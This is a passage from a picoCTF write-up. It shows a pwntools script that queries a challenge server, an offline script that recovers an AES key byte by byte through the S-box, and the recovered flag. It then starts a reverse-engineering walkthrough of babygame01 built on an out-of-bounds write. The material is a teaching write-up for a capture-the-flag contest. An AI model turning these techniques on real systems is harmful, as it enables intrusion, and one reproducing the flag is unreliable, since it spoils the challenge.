    part1 = pt[:2*(j)]
    part2 = pt[2*(j+1):]
    print(part1 + b" " + part2)
    for i in range(16*16):
        io = remote('saturn.picoctf.net', 52665)
        io.recvuntil('Please provide 16 bytes of plaintext encoded as hex: ')
        hexNum = i.to_bytes(1, byteorder='big', signed=False)
        hexNum = ''.join(format(x, '02x') for x in hexNum).encode()
        send = part1 + hexNum + part2
        io.sendline(send)
        ret = io.recvline().decode()
        if int(ret[-3:]) == 16:
            barray.append("0x" + hexNum.decode())
            print(barray)
        io.close()
    barray.append("ended")
```

This is supposed to get a huge array of byte values by position, the "ended" string splits between positions.

Instead of parsing and because of connection issues, I ran it like 6 times to get parts of the arrays and used regex in VS code to make the data usable in the next script.

Getting the bytes of the key:

```python
from pwn import *

from Crypto.Util.number import long_to_bytes

Sbox = (
    0x63, 0x7C, 0x77, 0x7B, 0xF2, 0x6B, 0x6F, 0xC5, 0x30, 0x01, 0x67, 0x2B, 0xFE, 0xD7, 0xAB, 0x76,
    0xCA, 0x82, 0xC9, 0x7D, 0xFA, 0x59, 0x47, 0xF0, 0xAD, 0xD4, 0xA2, 0xAF, 0x9C, 0xA4, 0x72, 0xC0,
    0xB7, 0xFD, 0x93, 0x26, 0x36, 0x3F, 0xF7, 0xCC, 0x34, 0xA5, 0xE5, 0xF1, 0x71, 0xD8, 0x31, 0x15,
    0x04, 0xC7, 0x23, 0xC3, 0x18, 0x96, 0x05, 0x9A, 0x07, 0x12, 0x80, 0xE2, 0xEB, 0x27, 0xB2, 0x75,
    0x09, 0x83, 0x2C, 0x1A, 0x1B, 0x6E, 0x5A, 0xA0, 0x52, 0x3B, 0xD6, 0xB3, 0x29, 0xE3, 0x2F, 0x84,
    0x53, 0xD1, 0x00, 0xED, 0x20, 0xFC, 0xB1, 0x5B, 0x6A, 0xCB, 0xBE, 0x39, 0x4A, 0x4C, 0x58, 0xCF,
    0xD0, 0xEF, 0xAA, 0xFB, 0x43, 0x4D, 0x33, 0x85, 0x45, 0xF9, 0x02, 0x7F, 0x50, 0x3C, 0x9F, 0xA8,
    0x51, 0xA3, 0x40, 0x8F, 0x92, 0x9D, 0x38, 0xF5, 0xBC, 0xB6, 0xDA, 0x21, 0x10, 0xFF, 0xF3, 0xD2,
    0xCD, 0x0C, 0x13, 0xEC, 0x5F, 0x97, 0x44, 0x17, 0xC4, 0xA7, 0x7E, 0x3D, 0x64, 0x5D, 0x19, 0x73,
    0x60, 0x81, 0x4F, 0xDC, 0x22, 0x2A, 0x90, 0x88, 0x46, 0xEE, 0xB8, 0x14, 0xDE, 0x5E, 0x0B, 0xDB,
    0xE0, 0x32, 0x3A, 0x0A, 0x49, 0x06, 0x24, 0x5C, 0xC2, 0xD3, 0xAC, 0x62, 0x91, 0x95, 0xE4, 0x79,
    0xE7, 0xC8, 0x37, 0x6D, 0x8D, 0xD5, 0x4E, 0xA9, 0x6C, 0x56, 0xF4, 0xEA, 0x65, 0x7A, 0xAE, 0x08,
    0xBA, 0x78, 0x25, 0x2E, 0x1C, 0xA6, 0xB4, 0xC6, 0xE8, 0xDD, 0x74, 0x1F, 0x4B, 0xBD, 0x8B, 0x8A,
    0x70, 0x3E, 0xB5, 0x66, 0x48, 0x03, 0xF6, 0x0E, 0x61, 0x35, 0x57, 0xB9, 0x86, 0xC1, 0x1D, 0x9E,
    0xE1, 0xF8, 0x98, 0x11, 0x69, 0xD9, 0x8E, 0x94, 0x9B, 0x1E, 0x87, 0xE9, 0xCE, 0x55, 0x28, 0xDF,
    0x8C, 0xA1, 0x89, 0x0D, 0xBF, 0xE6, 0x42, 0x68, 0x41, 0x99, 0x2D, 0x0F, 0xB0, 0x54, 0xBB, 0x16,
)


a1 = [0x02, 0x03, 0x0c, 0x0f, 0x10, 0x12, 0x13, 0x14, 0x16, 0x18, 0x19, 0x1a, 0x1d, 0x1f, 0x21, 0x28, 0x29, 0x2a, 0x2d, 0x2e, 0x2f, 0x30, 0x31, 0x32, 0x34, 0x39, 0x40, 0x43, 0x44, 0x45, 0x46, 0x47, 0x48, 0x4f, 0x50, 0x51, 0x53, 0x54, 0x56, 0x5f, 0x63, 0x64, 0x65, 0x66, 0x67, 0x69, 0x6c, 0x6e, 0x6f, 0x70, 0x72, 0x75, 0x76, 0x77, 0x78, 0x79, 0x7d, 0x7e, 0x85, 0x86, 0x88, 0x8b, 0x8e, 0x8f, 0x90, 0x93, 0x94, 0x96, 0x97, 0x98, 0x9a, 0x9b, 0x9d, 0x9e, 0x9f, 0xa0, 0xa1, 0xa2, 0xa5, 0xab, 0xac, 0xae, 0xaf, 0xb1, 0xb2, 0xb3, 0xb4, 0xb6, 0xb7, 0xb8, 0xbb, 0xbc, 0xbd, 0xbf, 0xc2, 0xc4, 0xc6, 0xca, 0xcb, 0xcc, 0xcd, 0xce, 0xd0, 0xd1, 0xd3, 0xd4, 0xd6, 0xd9, 0xdc, 0xdd, 0xe0, 0xe3, 0xe6, 0xe8, 0xea, 0xec, 0xed, 0xee, 0xf3, 0xf4, 0xf5, 0xf6, 0xf8, 0xf9, 0xfa, 0xfb, 0xfc, 0xfe]
a2 = [0x00, 0x01, 0x03, 0x05, 0x08, 0x10, 0x18, 0x19, 0x1b, 0x1c, 0x1e, 0x1f, 0x21, 0x22, 0x23, 0x25, 0x27, 0x28, 0x29, 0x2b, 0x2c, 0x2e, 0x32, 0x33, 0x3d, 0x3e, 0x41, 0x43, 0x44, 0x46, 0x47, 0x48, 0x49, 0x4c, 0x4f, 0x52, 0x54, 0x55, 0x56, 0x57, 0x58, 0x5d, 0x5e, 0x5f, 0x60, 0x61, 0x62, 0x65, 0x67, 0x6e, 0x71, 0x72, 0x74, 0x75, 0x76, 0x77, 0x79, 0x7e, 0x80, 0x82, 0x83, 0x85, 0x86, 0x87, 0x89, 0x8a, 0x8c, 0x8d, 0x8e, 0x90, 0x91, 0x93, 0x94, 0x9a, 0x9d, 0x9e, 0x9f, 0xa1, 0xa2, 0xa5, 0xa6, 0xa7, 0xa9, 0xaa, 0xab, 0xac, 0xae, 0xaf, 0xb4, 0xb7, 0xb9, 0xba, 0xbe, 0xbf, 0xc2, 0xc4, 0xc5, 0xc7, 0xc8, 0xc9, 0xca, 0xcb, 0xcd, 0xcf, 0xd1, 0xd2, 0xd7, 0xd9, 0xdb, 0xdc, 0xdd, 0xdf, 0xe0, 0xe1, 0xe2, 0xe5, 0xe7, 0xe8, 0xec, 0xed, 0xf3, 0xf5, 0xf7, 0xfa, 0xfb, 0xfc, 0xfd, 0xff]
a3 = [0x02, 0x03, 0x0c, 0x0f, 0x10, 0x12, 0x13, 0x14, 0x16, 0x18, 0x19, 0x1a, 0x1d, 0x1f, 0x21, 0x28, 0x29, 0x2a, 0x2d, 0x2e, 0x2f, 0x30, 0x31, 0x32, 0x34, 0x39, 0x40, 0x43, 0x44, 0x45, 0x46, 0x47, 0x48, 0x4f, 0x50, 0x51, 0x53, 0x54, 0x56, 0x5f, 0x63, 0x64, 0x65, 0x66, 0x67, 0x69, 0x6c, 0x6e, 0x6f, 0x70, 0x72, 0x75, 0x76, 0x77, 0x78, 0x79, 0x7d, 0x7e, 0x85, 0x86, 0x88, 0x8b, 0x8e, 0x8f, 0x90, 0x93, 0x94, 0x96, 0x97, 0x98, 0x9a, 0x9b, 0x9d, 0x9e, 0x9f, 0xa0, 0xa1, 0xa2, 0xa5, 0xab, 0xac, 0xae, 0xaf, 0xb1, 0xb2, 0xb3, 0xb4, 0xb6, 0xb7, 0xb8, 0xbb, 0xbc, 0xbd, 0xbf, 0xc2, 0xc4, 0xc6, 0xca, 0xcb, 0xcc, 0xcd, 0xce, 0xd0, 0xd1, 0xd3, 0xd4, 0xd6, 0xd9, 0xdc, 0xdd, 0xe0, 0xe3, 0xe6, 0xe8, 0xea, 0xec, 0xed, 0xee, 0xf3, 0xf4, 0xf5, 0xf6, 0xf8, 0xf9, 0xfa, 0xfb, 0xfc, 0xfe]
a4 = [0x00, 0x03, 0x0e, 0x0f, 0x11, 0x13, 0x14, 0x15, 0x16, 0x18, 0x1a, 0x1c, 0x1e, 0x1f, 0x21, 0x22, 0x23, 0x24, 0x25, 0x26, 0x2d, 0x35, 0x38, 0x3c, 0x3d, 0x3e, 0x43, 0x44, 0x48, 0x49, 0x4a, 0x4b, 0x4c, 0x4f, 0x53, 0x58, 0x5a, 0x5c, 0x5d, 0x5f, 0x60, 0x62, 0x63, 0x65, 0x68, 0x69, 0x6a, 0x6b, 0x6f, 0x71, 0x72, 0x74, 0x75, 0x79, 0x7a, 0x7b, 0x7c, 0x7e, 0x82, 0x83, 0x84, 0x87, 0x89, 0x8a, 0x91, 0x92, 0x93, 0x94, 0x96, 0x97, 0x98, 0x9a, 0x9b, 0x9c, 0x9f, 0xa0, 0xa2, 0xa3, 0xa7, 0xa9, 0xac, 0xad, 0xae, 0xb0, 0xb1, 0xb3, 0xb4, 0xb7, 0xb8, 0xba, 0xbb, 0xbd, 0xbe, 0xbf, 0xc0, 0xc1, 0xc2, 0xc6, 0xc7, 0xc8, 0xca, 0xce, 0xd0, 0xd1, 0xd5, 0xd8, 0xda, 0xdc, 0xdd, 0xdf, 0xe0, 0xe1, 0xe2, 0xe4, 0xe6, 0xea, 0xec, 0xef, 0xf0, 0xf2, 0xf4, 0xf5, 0xf6, 0xf7, 0xf8, 0xf9, 0xfa, 0xff]
a5 = [0x00, 0x01, 0x05, 0x08, 0x0a, 0x0c, 0x0d, 0x0f, 0x10, 0x11, 0x12, 0x16, 0x17, 0x18, 0x1a, 0x1e, 0x20, 0x22, 0x24, 0x25, 0x26, 0x27, 0x28, 0x29, 0x2a, 0x2f, 0x30, 0x31, 0x32, 0x34, 0x36, 0x3a, 0x3c, 0x3f, 0x41, 0x42, 0x43, 0x44, 0x46, 0x47, 0x48, 0x4a, 0x4b, 0x4c, 0x4f, 0x52, 0x53, 0x54, 0x57, 0x59, 0x5a, 0x60, 0x61, 0x63, 0x64, 0x67, 0x68, 0x6a, 0x6b, 0x6d, 0x6e, 0x6f, 0x70, 0x72, 0x73, 0x77, 0x79, 0x7c, 0x7d, 0x7e, 0x83, 0x88, 0x8a, 0x8c, 0x8d, 0x8f, 0x93, 0x94, 0x98, 0x99, 0x9a, 0x9b, 0x9c, 0x9f, 0xa1, 0xa2, 0xa4, 0xa5, 0xa9, 0xaa, 0xab, 0xac, 0xae, 0xb0, 0xb2, 0xb3, 0xb5, 0xb8, 0xb9, 0xba, 0xbb, 0xbf, 0xc1, 0xc3, 0xc4, 0xc5, 0xc6, 0xc8, 0xca, 0xcc, 0xce, 0xcf, 0xd0, 0xd3, 0xde, 0xdf, 0xe5, 0xe8, 0xec, 0xed, 0xee, 0xf1, 0xf2, 0xf3, 0xf4, 0xf5, 0xf6, 0xfd]
a6 = [0x02, 0x03, 0x04, 0x05, 0x07, 0x0b, 0x0d, 0x0f, 0x10, 0x14, 0x15, 0x18, 0x19, 0x1a, 0x1d, 0x1f, 0x21, 0x23, 0x24, 0x25, 0x27, 0x29, 0x2a, 0x2f, 0x30, 0x31, 0x32, 0x33, 0x35, 0x37, 0x3a, 0x3c, 0x3d, 0x3f, 0x41, 0x42, 0x46, 0x47, 0x4c, 0x4f, 0x51, 0x52, 0x53, 0x54, 0x56, 0x57, 0x59, 0x5a, 0x5d, 0x5e, 0x5f, 0x62, 0x65, 0x66, 0x67, 0x68, 0x69, 0x6b, 0x6c, 0x71, 0x72, 0x74, 0x75, 0x76, 0x78, 0x7a, 0x7b, 0x7d, 0x7e, 0x7f, 0x81, 0x86, 0x89, 0x8a, 0x8c, 0x8d, 0x8e, 0x8f, 0x96, 0x98, 0x99, 0x9a, 0x9d, 0x9f, 0xa0, 0xa5, 0xa6, 0xa7, 0xaa, 0xac, 0xad, 0xae, 0xaf, 0xb0, 0xb1, 0xb4, 0xb7, 0xb9, 0xbb, 0xbc, 0xbe, 0xbf, 0xc5, 0xc6, 0xca, 0xcb, 0xd0, 0xd1, 0xd3, 0xd4, 0xd6, 0xd9, 0xda, 0xdb, 0xdd, 0xdf, 0xe0, 0xe1, 0xe3, 0xe4, 0xe6, 0xe7, 0xe8, 0xf0, 0xf8, 0xf9, 0xfb, 0xfd]
a7 = [0x00, 0x01, 0x02, 0x03, 0x05, 0x06, 0x09, 0x0e, 0x10, 0x12, 0x15, 0x16, 0x17, 0x19, 0x20, 0x21, 0x22, 0x23, 0x25, 0x28, 0x29, 0x2a, 0x2f, 0x30, 0x31, 0x33, 0x34, 0x36, 0x38, 0x3b, 0x3e, 0x3f, 0x44, 0x45, 0x49, 0x4a, 0x50, 0x52, 0x54, 0x55, 0x56, 0x59, 0x5b, 0x5c, 0x5e, 0x5f, 0x67, 0x68, 0x69, 0x6b, 0x6c, 0x6e, 0x6f, 0x72, 0x74, 0x76, 0x77, 0x7f, 0x80, 0x82, 0x84, 0x88, 0x8a, 0x8b, 0x8c, 0x8d, 0x90, 0x92, 0x95, 0x96, 0x97, 0x9a, 0x9b, 0x9f, 0xa0, 0xa5, 0xa6, 0xa8, 0xaa, 0xab, 0xac, 0xae, 0xb0, 0xb2, 0xb3, 0xb5, 0xb8, 0xba, 0xbc, 0xbd, 0xbe, 0xbf, 0xc0, 0xc3, 0xc8, 0xc9, 0xcd, 0xce, 0xd0, 0xd1, 0xd2, 0xd5, 0xd6, 0xd8, 0xd9, 0xdb, 0xdc, 0xdd, 0xde, 0xe3, 0xe4, 0xe6, 0xe7, 0xe8, 0xe9, 0xea, 0xed, 0xf0, 0xf1, 0xf2, 0xf4, 0xf5, 0xf7, 0xf9, 0xfa, 0xfb, 0xfd, 0xfe]
a8 = [0x00, 0x02, 0x03, 0x05, 0x06, 0x07, 0x08, 0x0b, 0x0c, 0x0e, 0x0f, 0x10, 0x13, 0x16, 0x17, 0x1d, 0x1e, 0x20, 0x23, 0x24, 0x25, 0x27, 0x29, 0x2a, 0x2b, 0x2c, 0x2e, 0x2f, 0x33, 0x34, 0x36, 0x37, 0x38, 0x39, 0x3a, 0x3d, 0x41, 0x44, 0x45, 0x48, 0x49, 0x4b, 0x4c, 0x4e, 0x52, 0x53, 0x54, 0x55, 0x56, 0x5a, 0x5c, 0x5e, 0x60, 0x61, 0x62, 0x63, 0x64, 0x66, 0x6b, 0x6c, 0x6d, 0x6e, 0x70, 0x72, 0x74, 0x75, 0x76, 0x78, 0x7b, 0x7e, 0x80, 0x81, 0x82, 0x85, 0x87, 0x88, 0x8a, 0x8b, 0x8c, 0x8e, 0x94, 0x97, 0x9a, 0x9b, 0xa1, 0xa8, 0xa9, 0xaa, 0xac, 0xb0, 0xb1, 0xb2, 0xb5, 0xb6, 0xb7, 0xb9, 0xc7, 0xc8, 0xc9, 0xcb, 0xcc, 0xce, 0xd0, 0xd7, 0xd8, 0xdb, 0xdc, 0xdd, 0xde, 0xdf, 0xe0, 0xe1, 0xe5, 0xe6, 0xe8, 0xea, 0xed, 0xee, 0xef, 0xf1, 0xf4, 0xf6, 0xf7, 0xfb, 0xfc, 0xfd, 0xfe, 0xff]
a9 = [0x01, 0x02, 0x03, 0x04, 0x06, 0x07, 0x08, 0x0b, 0x0c, 0x0d, 0x0f, 0x10, 0x11, 0x12, 0x15, 0x1b, 0x1c, 0x1e, 0x1f, 0x20, 0x23, 0x24, 0x26, 0x27, 0x28, 0x2a, 0x2b, 0x2d, 0x2e, 0x2f, 0x35, 0x36, 0x38, 0x3b, 0x3e, 0x3f, 0x43, 0x44, 0x45, 0x46, 0x48, 0x49, 0x4a, 0x4b, 0x4c, 0x4e, 0x50, 0x53, 0x56, 0x58, 0x5a, 0x5c, 0x5d, 0x5e, 0x60, 0x61, 0x63, 0x64, 0x66, 0x69, 0x6c, 0x6d, 0x72, 0x74, 0x76, 0x7a, 0x7b, 0x7c, 0x7d, 0x7e, 0x80, 0x81, 0x82, 0x84, 0x89, 0x91, 0x98, 0x99, 0x9a, 0x9d, 0x9e, 0x9f, 0xa0, 0xa2, 0xa3, 0xa4, 0xa6, 0xa8, 0xa9, 0xaa, 0xad, 0xaf, 0xb2, 0xb3, 0xbc, 0xbf, 0xc0, 0xc2, 0xc5, 0xc6, 0xc7, 0xc8, 0xc9, 0xcd, 0xce, 0xd3, 0xd4, 0xd5, 0xd6, 0xd7, 0xd9, 0xdc, 0xde, 0xdf, 0xe0, 0xe1, 0xe3, 0xe4, 0xe6, 0xef, 0xf0, 0xf3, 0xf4, 0xf5, 0xf6, 0xf7, 0xf8, 0xff] 
a10 = [0x01, 0x02, 0x07, 0x09, 0x0b, 0x0c, 0x0d, 0x0f, 0x12, 0x14, 0x15, 0x17, 0x18, 0x19, 0x1a, 0x1b, 0x1d, 0x1f, 0x23, 0x25, 0x27, 0x2a, 0x2b, 0x2c, 0x2d, 0x2f, 0x30, 0x31, 0x32, 0x35, 0x37, 0x38, 0x3c, 0x3d, 0x40, 0x41, 0x43, 0x44, 0x4a, 0x4d, 0x4e, 0x4f, 0x50, 0x52, 0x53, 0x55, 0x56, 0x57, 0x59, 0x5a, 0x5c, 0x5d, 0x5e, 0x64, 0x67, 0x69, 0x6a, 0x6e, 0x6f, 0x71, 0x72, 0x75, 0x76, 0x77, 0x79, 0x7a, 0x7b, 0x7c, 0x7e, 0x7f, 0x82, 0x84, 0x85, 0x86, 0x87, 0x88, 0x8d, 0x8e, 0x8f, 0x91, 0x93, 0x94, 0x96, 0x97, 0x98, 0x99, 0x9c, 0x9f, 0xa1, 0xa2, 0xa4, 0xa5, 0xa6, 0xa7, 0xa9, 0xae, 0xb0, 0xb1, 0xb2, 0xb5, 0xb7, 0xbe, 0xc0, 0xc8, 0xc9, 0xcb, 0xcc, 0xce, 0xcf, 0xd0, 0xd1, 0xd3, 0xd5, 0xd8, 0xe2, 0xe3, 0xed, 0xee, 0xf1, 0xf2, 0xf3, 0xf5, 0xf7, 0xf8, 0xf9, 0xfb, 0xfc, 0xfe]
a11 = [0x01, 0x02, 0x04, 0x05, 0x09, 0x0a, 0x0b, 0x0c, 0x0e, 0x10, 0x12, 0x13, 0x15, 0x18, 0x19, 0x1a, 0x1b, 0x1f, 0x23, 0x28, 0x2a, 0x2c, 0x2d, 0x2f, 0x33, 0x34, 0x38, 0x39, 0x3a, 0x3b, 0x3c, 0x3f, 0x45, 0x48, 0x4c, 0x4d, 0x4e, 0x51, 0x52, 0x53, 0x54, 0x55, 0x56, 0x5d, 0x61, 0x63, 0x64, 0x65, 0x66, 0x68, 0x6a, 0x6c, 0x6e, 0x6f, 0x70, 0x73, 0x7e, 0x7f, 0x80, 0x82, 0x84, 0x85, 0x86, 0x87, 0x88, 0x89, 0x8a, 0x8f, 0x90, 0x91, 0x92, 0x94, 0x96, 0x9a, 0x9c, 0x9f, 0xa0, 0xa1, 0xa5, 0xa8, 0xaa, 0xac, 0xad, 0xaf, 0xb0, 0xb1, 0xb2, 0xb6, 0xb7, 0xb8, 0xba, 0xbe, 0xc0, 0xc1, 0xc3, 0xc4, 0xc7, 0xc8, 0xca, 0xcb, 0xcd, 0xce, 0xcf, 0xd0, 0xd2, 0xd3, 0xd7, 0xd9, 0xdc, 0xdd, 0xde, 0xe1, 0xe2, 0xe3, 0xe4, 0xe6, 0xe7, 0xe8, 0xea, 0xeb, 0xec, 0xef, 0xf2, 0xf3, 0xf4, 0xf7, 0xf9, 0xfa]
a12 = [0x05, 0x08, 0x0c, 0x0d, 0x0e, 0x11, 0x12, 0x13, 0x14, 0x15, 0x16, 0x1d, 0x21, 0x23, 0x24, 0x25, 0x26, 0x28, 0x2a, 0x2c, 0x2e, 0x2f, 0x30, 0x33, 0x3e, 0x3f, 0x41, 0x42, 0x44, 0x45, 0x49, 0x4a, 0x4b, 0x4c, 0x4e, 0x50, 0x52, 0x53, 0x55, 0x58, 0x59, 0x5a, 0x5b, 0x5f, 0x63, 0x68, 0x6a, 0x6c, 0x6d, 0x6f, 0x73, 0x74, 0x78, 0x79, 0x7a, 0x7b, 0x7c, 0x7f, 0x80, 0x81, 0x83, 0x84, 0x87, 0x88, 0x8a, 0x8b, 0x8d, 0x8e, 0x8f, 0x90, 0x92, 0x93, 0x97, 0x99, 0x9c, 0x9d, 0x9e, 0xa1, 0xa2, 0xa3, 0xa4, 0xa6, 0xa7, 0xa8, 0xaa, 0xab, 0xac, 0xaf, 0xb2, 0xb3, 0xb4, 0xb7, 0xb9, 0xba, 0xc0, 0xc2, 0xc4, 0xc5, 0xc6, 0xc7, 0xc8, 0xc9, 0xca, 0xcf, 0xd0, 0xd1, 0xd2, 0xd4, 0xd6, 0xda, 0xdc, 0xdf, 0xe0, 0xe1, 0xe5, 0xe8, 0xea, 0xec, 0xed, 0xef, 0xf0, 0xf1, 0xf2, 0xf6, 0xf7, 0xf8, 0xfa, 0xfe]
a13 = [0x02, 0x03, 0x05, 0x06, 0x08, 0x0b, 0x10, 0x12, 0x13, 0x15, 0x16, 0x17, 0x19, 0x1a, 0x1b, 0x1d, 0x1e, 0x21, 0x22, 0x23, 0x26, 0x28, 0x2c, 0x2d, 0x2f, 0x30, 0x31, 0x32, 0x35, 0x36, 0x39, 0x3a, 0x3b, 0x3c, 0x3e, 0x3f, 0x40, 0x41, 0x43, 0x46, 0x47, 0x49, 0x4b, 0x4f, 0x50, 0x51, 0x54, 0x59, 0x5b, 0x5c, 0x5d, 0x5e, 0x60, 0x61, 0x63, 0x65, 0x67, 0x6b, 0x6d, 0x6e, 0x71, 0x73, 0x74, 0x75, 0x76, 0x77, 0x78, 0x79, 0x7b, 0x7e, 0x81, 0x82, 0x8e, 0x8f, 0x90, 0x92, 0x94, 0x95, 0x97, 0x99, 0x9b, 0x9d, 0x9e, 0x9f, 0xa0, 0xa2, 0xa3, 0xa4, 0xa5, 0xa7, 0xac, 0xb4, 0xb9, 0xbc, 0xbd, 0xbf, 0xc2, 0xc5, 0xc8, 0xc9, 0xca, 0xcb, 0xcd, 0xce, 0xd2, 0xd9, 0xdb, 0xdc, 0xdd, 0xde, 0xe1, 0xe2, 0xe3, 0xe4, 0xe8, 0xe9, 0xea, 0xeb, 0xee, 0xf0, 0xf3, 0xf4, 0xf5, 0xf8, 0xfa, 0xfb, 0xfd, 0xff]
a14 = [0x00, 0x01, 0x02, 0x03, 0x05, 0x08, 0x09, 0x0a, 0x0f, 0x10, 0x11, 0x13, 0x14, 0x16, 0x18, 0x1b, 0x1e, 0x1f, 0x20, 0x21, 0x22, 0x23, 0x25, 0x26, 0x29, 0x2e, 0x30, 0x32, 0x35, 0x36, 0x37, 0x39, 0x47, 0x48, 0x49, 0x4b, 0x4c, 0x4e, 0x4f, 0x52, 0x54, 0x56, 0x57, 0x5f, 0x64, 0x65, 0x69, 0x6a, 0x70, 0x72, 0x74, 0x75, 0x76, 0x79, 0x7b, 0x7c, 0x7e, 0x7f, 0x80, 0x85, 0x86, 0x88, 0x8a, 0x8b, 0x8c, 0x8e, 0x90, 0x92, 0x93, 0x95, 0x98, 0x9a, 0x9c, 0x9d, 0x9e, 0x9f, 0xa0, 0xa2, 0xa4, 0xa8, 0xaa, 0xab, 0xac, 0xad, 0xb0, 0xb2, 0xb5, 0xb6, 0xb7, 0xba, 0xbb, 0xbf, 0xc3, 0xc4, 0xc6, 0xc7, 0xc8, 0xc9, 0xca, 0xcd, 0xd0, 0xd1, 0xd2, 0xd4, 0xd5, 0xd7, 0xd9, 0xda, 0xdb, 0xdd, 0xde, 0xe0, 0xe3, 0xe8, 0xe9, 0xed, 0xee, 0xf0, 0xf1, 0xf2, 0xf5, 0xf6, 0xf8, 0xf9, 0xfb, 0xfc, 0xfd, 0xfe]
a15 = [0x00, 0x01, 0x03, 0x04, 0x06, 0x07, 0x0f, 0x17, 0x1a, 0x1c, 0x1e, 0x1f, 0x21, 0x22, 0x2c, 0x2d, 0x31, 0x33, 0x34, 0x36, 0x37, 0x38, 0x3a, 0x3c, 0x3d, 0x3e, 0x40, 0x41, 0x42, 0x47, 0x48, 0x49, 0x4a, 0x4b, 0x4d, 0x50, 0x53, 0x56, 0x57, 0x58, 0x59, 0x5b, 0x5c, 0x5e, 0x61, 0x66, 0x68, 0x69, 0x6a, 0x6b, 0x6d, 0x6e, 0x71, 0x78, 0x7a, 0x7d, 0x7e, 0x7f, 0x80, 0x81, 0x82, 0x85, 0x8b, 0x8c, 0x8e, 0x8f, 0x91, 0x92, 0x93, 0x95, 0x96, 0x98, 0x99, 0x9a, 0x9c, 0x9d, 0x9f, 0xa0, 0xa1, 0xa5, 0xa6, 0xa8, 0xab, 0xb0, 0xb1, 0xb3, 0xb4, 0xb5, 0xb6, 0xb8, 0xb9, 0xba, 0xbd, 0xbe, 0xc0, 0xc2, 0xc3, 0xc4, 0xc6, 0xc8, 0xcd, 0xce, 0xd0, 0xd2, 0xd4, 0xd5, 0xd6, 0xd7, 0xd8, 0xda, 0xdb, 0xdd, 0xe0, 0xe2, 0xe3, 0xe4, 0xe5, 0xe8, 0xea, 0xec, 0xf2, 0xf3, 0xf7, 0xf8, 0xfa, 0xfd, 0xfe, 0xff]
a16 = [0x03, 0x05, 0x06, 0x07, 0x0e, 0x16, 0x18, 0x19, 0x1a, 0x1d, 0x1e, 0x1f, 0x21, 0x23, 0x24, 0x25, 0x27, 0x28, 0x2a, 0x2d, 0x2e, 0x2f, 0x34, 0x35, 0x38, 0x3b, 0x40, 0x41, 0x42, 0x45, 0x47, 0x49, 0x4a, 0x4e, 0x4f, 0x50, 0x51, 0x52, 0x53, 0x54, 0x58, 0x59, 0x5b, 0x5e, 0x61, 0x63, 0x64, 0x66, 0x67, 0x68, 0x70, 0x71, 0x72, 0x73, 0x74, 0x77, 0x78, 0x7f, 0x80, 0x81, 0x83, 0x84, 0x85, 0x86, 0x88, 0x8a, 0x8b, 0x8c, 0x8f, 0x92, 0x95, 0x96, 0x97, 0x98, 0x99, 0x9b, 0x9c, 0xa0, 0xa1, 0xa3, 0xa4, 0xa7, 0xa8, 0xa9, 0xaa, 0xac, 0xad, 0xaf, 0xb1, 0xb2, 0xb8, 0xb9, 0xbc, 0xbf, 0xc1, 0xc2, 0xc3, 0xc4, 0xc9, 0xcb, 0xcc, 0xcd, 0xce, 0xcf, 0xd1, 0xd4, 0xd7, 0xd9, 0xda, 0xdb, 0xdd, 0xdf, 0xe1, 0xe3, 0xe4, 0xe6, 0xe7, 0xea, 0xeb, 0xee, 0xf1, 0xf3, 0xf5, 0xf9, 0xfa, 0xfb, 0xfc, 0xfd]

key_guess = []

for i in range(16*16):
    check = True
    j = 0
    while check:
        if j < len(a16):
            ans = xor(i, a16[j])[-2:]
            ans = ''.join(format(x, '02x') for x in ans).encode()
            if Sbox[int(ans, 16)] & 0x01 != 1:
                check = False
            j += 1
        else:
            key_guess.append(i)
            print("key_guess = ", key_guess)
            check = False

hex_list = [hex(num) for num in key_guess]
hex_str = "".join(hex_list)
print(hex_str[2:])

# 9dac9d914154db052d7ce1a110fbb3aa
```

This script checks all which bytes we collected with a bruteforced key value to check if the computation:

```python
Sbox[int(ans, 16)] & 0x01 == 0x01
```

is true.

The *only* value that should satisfy the byte values is the part of the key.

To decode each byte I replaced the a-number varible inside the loop each run.

After running the scripts I got the flag

> picoCTF{9dac9d914154db052d7ce1a110fbb3aa}

*Rant:* I don't know if my calclation was the worst way possible to crack this challenge because the total computation time ONLY connecting and bruteforcing across the network took like an hour+.

The computation in the other python file that was done offline took less than a second so I wonder if I could speedup the connection speed to not make this challenge agonizinly stressful and painful every time I found a bug.

If you see this writeup, let me know how you did it, I would LOVE to see real solutions for this challenge from you guys.

Thank you for reading this writeup.

___
___

# babygame01

**100 points**

AUTHOR: PALASH OSWAL

Description
Get the flag and reach the exit.
Welcome to BabyGame! Navigate around the map and see what you can find! The game is available to download [here](). There is no source available, so you'll have to figure your way around the map. You can connect with it using nc saturn.picoctf.net 64790.

___

Damn I don't know how to describe this challenge, it was just something.

Bla bla the game is to get to a specific square in the game using `wasd` cool.

Let's look at the code itself using `IDA`.

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  char v4; // [esp+1h] [ebp-AA5h]
  int v5[2]; // [esp+2h] [ebp-AA4h] BYREF
  char v6; // [esp+Ah] [ebp-A9Ch]
  char v7[2700]; // [esp+Eh] [ebp-A98h] BYREF
  unsigned int v8; // [esp+A9Ah] [ebp-Ch]
  int *p_argc; // [esp+A9Eh] [ebp-8h]

  p_argc = &argc;
  v8 = __readgsdword(0x14u);
  init_player(v5);
  init_map(v7, v5);
  print_map(v7, v5);
  signal(2, sigint_handler);
  do
  {
    do
    {
      v4 = getchar(p_argc);
      move_player(v5, v4, v7);
      print_map(v7, v5);
    }
    while ( v5[0] != 29 );
  }
  while ( v5[1] != 89 );
  puts("You win!");
  if ( v6 )
  {
    puts("flage");
    win();
    fflush(stdout);
  }
  return 0;
}
```

To #win we need to make `v6` not zero.

Because it was placed super well above the varible `v7` I tried for ages to perfom a buffer overflow using the `getchar()` function itself, dud.

The relevant piece of code to solve this is in the `move_player` function.

```c
_BYTE *__cdecl move_player(_DWORD *a1, char a2, int a3)
{
  _BYTE *result; // eax

  if ( a2 == 108 )
    player_tile = getchar();
  if ( a2 == 112 )
    solve_round(a3, a1);
  *(_BYTE *)(a1[1] + a3 + 90 * *a1) = 46;
  switch ( a2 )
  {
    case 'w':
      --*a1;
      break;
    case 's':
      ++*a1;
      break;
    case 'a':
      --a1[1];
      break;
    case 'd':
      ++a1[1];
      break;
  }
  result = (_BYTE *)(a1[1] + a3 + 90 * *a1);
  *result = player_tile;
  return result;
}
```

2 secret commands are now shown to us:

* `l` -> used to assign `player_tile` a value from `getchar()`

* `p` -> solve the game.

The trick is at the bottom of the function with these lines:

```c
result = (_BYTE *)(a1[1] + a3 + 90 * *a1);
*result = player_tile;
```

`result` is a pointer and the first line we give it the adderss to point to.

